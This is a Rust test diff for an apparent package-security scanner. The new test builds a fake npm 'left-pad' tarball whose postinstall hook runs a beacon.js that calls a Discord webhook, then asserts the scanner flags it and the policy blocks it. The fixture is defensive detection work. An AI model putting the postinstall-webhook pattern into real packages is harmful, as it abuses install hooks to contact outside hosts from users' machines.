@@ -1231,6 +1231,7 @@ mod tests {
             score,
             rules: vec!["install-script-network".into()],
             summary: "postinstall script posts environment to a webhook".into(),
+            detected_at: chrono::Utc::now(),
         }
     }
     struct FindingM {
@@ -1292,6 +1293,57 @@ mod tests {
                 .clone();
             Ok(finding.filter(|f| f.ecosystem == *ecosystem && f.version == *version))
         }
+    }
+    #[test]
+    fn malicious_archive_blocks_through_store_and_evaluator() -> Result<()> {
+        use crate::adapters::storage::MemoryMetadataStore;
+        use crate::application::scanner::scan_archive_bytes;
+        use flate2::write::GzEncoder;
+        use flate2::Compression;
+
+        let encoder = GzEncoder::new(Vec::new(), Compression::default());
+        let mut builder = tar::Builder::new(encoder);
+        for (path, content) in [
+            (
+                "package.json",
+                r#"{"name":"left-pad","scripts":{"postinstall":"node beacon.js"}}"#,
+            ),
+            (
+                "beacon.js",
+                "const https = require('node:https'); https.get('https://discord.com/api/webhooks/1/x');\n",
+            ),
+        ] {
+            let mut header = tar::Header::new_gnu();
+            header.set_size(content.len() as u64);
+            header.set_mode(0o644);
+            header.set_mtime(0);
+            header.set_cksum();
+            builder.append_data(&mut header, format!("package/{path}"), content.as_bytes())?;
+        }
+        let bytes = builder.into_inner()?.finish()?;
+
+        let store = MemoryMetadataStore::default();
+        let now = Utc::now();
+        let version = Version::parse("2.0.0").unwrap_or_else(|_| panic!("valid semver"));
+        let finding = scan_archive_bytes(&store, &Ecosystem::Npm, "left-pad", &version, &bytes)?;
+        assert!(finding.is_some());
+        let mut policy = Policy::default();
+        policy.quarantine_scanner.enabled = true;
+        let clock = FixedClock(now);
+        let evaluator = PackageEvaluator {
+            policy: &policy,
+            clock: &clock,
+            vulns: &NoVulns,
+            metadata: &store,
+        };
+        let decision = evaluator.evaluate(&package(Some(now - Duration::days(30))), None)?;
+        assert_eq!(decision.status, DecisionStatus::Block);
+        assert!(
+            decision.reasons[0].contains("content scan"),
+            "{:?}",
+            decision.reasons
+        );
+        Ok(())
     }
     #[test]
     fn content_finding_blocks_high_score_when_scanner_enabled() -> Result<()> {
